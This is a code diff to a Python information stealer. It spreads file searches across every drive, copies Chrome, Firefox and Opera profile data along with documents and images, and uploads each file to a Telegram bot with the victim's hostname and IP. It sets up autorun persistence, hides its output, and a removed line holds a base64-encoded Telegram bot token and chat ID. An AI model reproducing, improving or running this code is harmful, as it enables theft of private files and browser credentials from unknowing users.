@@ -1,4 +1,5 @@
 import os
+import contextlib
 import sys
 import shutil
 import socket
@@ -6,6 +7,7 @@ from multiprocessing import Pool,Process,Queue,Lock
 import multiprocessing
 import requests
 import base64
+import subprocess
 import time
 import glob
 import logging
@@ -13,6 +15,8 @@ import random
 import sys
 if os.name=='nt':
     try:
+        import pythoncom
+        import win32com       
         import win32com.client
         import winreg                    
         import winshell
@@ -24,6 +28,30 @@ file_list=[]
 sep='/'
 chtid=wt=0
 links_list=[]
+def checkIFRunned(num):
+    myname=sys.argv[0]
+    base=os.path.basename(myname)
+    myname,base=base,myname
+    print(f"{myname=}{base=}")
+    sFlag=0
+    cmd="tasklist"
+    if os.name=='nt':
+        res= subprocess.check_output(f'chcp 65001 | {cmd}', shell=True)
+    else:
+        res= subprocess.check_output(f'ps auxw', shell=True)
+    try:
+        res=res.rstrip(b'\x00').decode("utf_8")
+        res=str(res).split('\n')
+    except:
+        res=str(res).split(r'\r\n')
+    for item in res:
+        if myname in item:
+            sFlag+=1
+    if sFlag>num:
+        return 1
+    else: 
+        return 0
+        
 def gen_random_name(dirname):
     while True:
         fname=''
@@ -104,19 +132,20 @@ def waitForConnection():
             break
  
 
-def get_files(directory_path,extlist):
+def get_files(directory_list,extlist):
     global file_list
     hostname=socket.gethostname()
-    for root, dirs, files in os.walk(directory_path):
-        for name in files:
-            fname=os.path.join(root, name)
-            if any([ele for  ele in extlist if fname.endswith("."+ele)]):
-                splittup=os.path.splitext(fname)
-                ext=splittup[1]
-                if ext=='':
-                    ext='default'
-                if not fname.startswith('/media') and not hostname in fname:
-                    file_list.append((fname,ext[1:]))
+    for directory_path in directory_list:
+        for root, dirs, files in os.walk(directory_path):
+            for name in files:
+                fname=os.path.join(root, name)
+                if any([ele for  ele in extlist if fname.endswith("."+ele)]):
+                    splittup=os.path.splitext(fname)
+                    ext=splittup[1]
+                    if ext=='':
+                        ext='default'
+                    if not hostname in fname:
+                        file_list.append((fname,ext[1:]))
 
 def winntAutoRun():
     fname=sys.argv[0]
@@ -271,7 +300,7 @@ def addToAutoRun():
     else:
         newScripFName=home+sep+".config"+sep+scrptName
     copyFile(scrptName,newScripFName)
-    copyFile("config.py",home+sep+".config"+sep+"config.py")
+    # copyFile("config.py",home+sep+".config"+sep+"config.py")
     shell=shell[shell[::-1].index(sep)*(-1):]
     if os.name=='nt':
         shell=shell[:shell.index('.')]
@@ -312,44 +341,70 @@ def send_document(bot_token,chtid,docfile,caption='Nothing'):
     r=requests.post(url,params=data,files=files)
     return
 
+def searchFilesProc(fileList,drive,extlist):
+    global PROC_NUM
+    hostname=socket.gethostname()
+    print(f"Process {multiprocessing.current_process()} has activted drive {drive} ")
+    for root, dirs, files in os.walk(drive):
+        for name in files:
+            fname=os.path.join(root, name)
+            if any([ele for  ele in extlist if fname.endswith("."+ele)]):
+                splittup=os.path.splitext(fname)
+                ext=splittup[1]
+                if ext=='':
+                    ext='default'
+                if not hostname in fname:
+                    fileList.append((fname,ext[1:]))
 
+                
 def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
     cnt=num
     PROC_NUM=15
+    pname=''
     global sep
     if os.name=='nt':
         sep='\\'
     logging.info(f'Proc number {num} activated')
     while True:
         while len(fileList)>=num:
-            if fileList[cnt]=='TERMINATED':
+            try:
+                if fileList[cnt]=='TERMINATED':
+                    print("msg * TERMINATED")
+                    return
+            except Exception as e:
                 return
             try:
                 fname,dname=fileList[cnt]
-                dirname=f"{hostdir}{sep}{dname}"
-                if not os.path.exists(dirname):
-                    os.mkdir(dirname)
-                logging.info(f'Proc {num}:',fname)
-                newname=fname[len(fname)-fname[::-1].index(sep)-1:]
-                if not any([ele for ele in ["opera","firefox","chrome","chromium","safari"] if (ele in dirname) ]):
-                    newname=fname.replace(':\\','.')
-                    newname=newname.replace(sep,'.')
-                copyFile(fname,f"{dirname}{sep}{newname}")
-                fname=fname.replace('\\\\','\\')
+                if fname!=pname:
+                    pname=fname
+                    dirname=f"{hostdir}{sep}{dname}"
+                    if not os.path.exists(dirname):
+                        os.mkdir(dirname)
+                    print(f'Proc {num}:',fname)
+                    newname=fname[len(fname)-fname[::-1].index(sep)-1:]
+                    if not any([ele for ele in ["opera","firefox","chrome","chromium","safari"] if (ele in dirname) ]):
+                        newname=fname.replace(':\\','.')
+                        newname=newname.replace(sep,'.')
+                    copyFile(fname,f"{dirname}{sep}{newname}")
+                    fname=fname.replace('\\\\','\\')
             except:
                 pass
             try:
-                fname,dname=fileList[cnt]          
+                fname,dname=fileList[cnt]                         
                 send_document(wt,cht,fname,f"Folder:{dname} Host:{hostname} Origname:{os.path.split(fname)[1]} {fname}")
             except:
                 pass
             try:
-                if os.path.exists(fileList[cnt][0]):
+                if os.path.exists(fileList[cnt+PROC_NUM][0]) or fileList[cnt+PROC_NUM]=='TERMINATED' :
                     cnt+=PROC_NUM
             except:
                 pass
 
 def main():
+    if os.name =='nt':
+        res=checkIFRunned(4)
+        if res==True:
+            return
     global PROC_NUM
     global sep
     global file_list
@@ -369,7 +424,7 @@ def main():
     waitForConnection()
     chtid=wt=0
 
-    basestr="CldJRklfQk9UX1RPS0VOPSc1MTQ2OTY4Mzg2OkFBR0NPZUExR1BFNDJicDIxOTYzOE9LazBDdzYxdGg1OGtzJwpDSFRJRD0xMjEyMDYzODk5Cg=="
+    basestr=""
     dstr=base64.b64decode(basestr)
     mystr=dstr.decode('ascii')
     keys=mystr.split('\n')
@@ -409,14 +464,14 @@ def main():
             
     #extlist=['ini','inf','reg','sh','pl','py','sql']# here you type file extensions you want save on your USB device
     extlist=['jpg','jpeg','gif','doc','docx','pdf']
-    multiprocessing.freeze_support()
+    
     with multiprocessing.Manager() as manager:
         file_list=manager.list()
         procs=[]
-        for num in range(1,PROC_NUM+1):
-            procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname}-{ip_address}",wt,cht)))
-        for proc in procs:
-            proc.start()
+        for num in range(0,PROC_NUM):
+            prc=Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname}-{ip_address}",wt,cht))
+            prc.start()
+            procs.append(prc)
 
         if os.name!= 'nt':
             directory_path='/'
@@ -435,6 +490,10 @@ def main():
             for file in glob.glob(os.environ['HOME']+"/.config/opera/*"):
                 file_list.append((file,'opera'))
 
+            try:
+                get_files([directory_path],extlist) 
+            except:
+                pass
 
         else:
             for file in glob.glob(os.environ['APPDATA']+"\..\\Local\\Google\\Chrome\\User Data\\Default\\*"):
@@ -447,16 +506,35 @@ def main():
             for file in glob.glob(os.environ['APPDATA']+"\\Mozilla\\Firefox\\Profiles\\*.default-release\\*"):
                 file_list.append((file,'firefox'))
     
-            directory_path=r'D:\\'
-        get_files(directory_path,extlist) 
-        if os.name=='nt':
-            directory_path=r'C:\\'
-            get_files(directory_path,extlist)
-            
+        try:
+            if os.name=='nt':
+                shell = win32com.client.Dispatch("Scripting.FileSystemObject")
+                drives=shell.Drives
+                procdrives=[]
+                for drive in drives:
+                    try:
+                        vname=str(shell.GetDrive(drive).VolumeName)
+                        vname=vname.lower()
+                        drive=str(drive)+"\\"
+                        if vname!="diskcryptor" and not "flash" in vname:
+                            print(drive)    
+                            proc=Process(target=searchFilesProc,args=(file_list,drive,extlist))
+                            proc.start()
+                            procdrives.append(proc)
+                    except pythoncom.com_error as error:
+                        print("comerror")                            
+                for procd in procdrives:
+                    procd.join()         
+                
+        except:
+            pass
         for num in range(1,PROC_NUM+1):
             file_list.append('TERMINATED')
             
         for proc in procs:
             proc.join() 
 if __name__ == '__main__':
-	main()
+    multiprocessing.freeze_support()
+    with contextlib.redirect_stdout(None):
+        with contextlib.redirect_stderr(None):
+            main()
